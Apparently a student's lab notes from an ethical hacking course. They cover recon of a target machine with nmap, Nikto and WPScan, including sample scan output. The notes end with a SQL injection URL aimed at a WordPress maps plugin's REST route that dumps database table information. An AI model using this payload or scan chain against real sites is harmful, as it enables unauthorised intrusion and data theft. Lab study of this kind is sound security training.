# Ethical Hacking Playbook Notes

## Week 1
- Get IP address of vulnerable machine
  - `ip a` to get IP addresses of hacking machine
  - Review output to find the relevant network id
  - `nmap [ip]/[subnet-mask] -T5` to get list of everything on that network
  - Look at output - one of them will be the hacker devices and others will be the target devices. Find the target device
- NMAP of vulnerable device to see what it's got going on
  - `nmap -sV [ip addr] -T5 -p-` to scan all ports on the target device (this also banner grabs)
```
  PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
23/tcp   open  telnet      Linux telnetd
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
4343/tcp open  unicall?
```
- Review what is running
  - We see that 80/tcp is open so we can use Nikto to see what is running
- Nikto
  - `nikto -h http://[ip]`
  - From here, we can see that WordPress exists so we can use WP Scan to dig into it
- WP Scan
  - `wpscan --url http://[ip]`
  - From this we can see what plugins are on the WordPress. Open their readmes and check what their versions are then google it to find the vulnerable one.
- WP Rest Route
  - `http://loan.atlas.local/index.php?rest_route=/wpgmza/v1/markers&filter={}&fields=*from%20Information_schema.tables--%20-`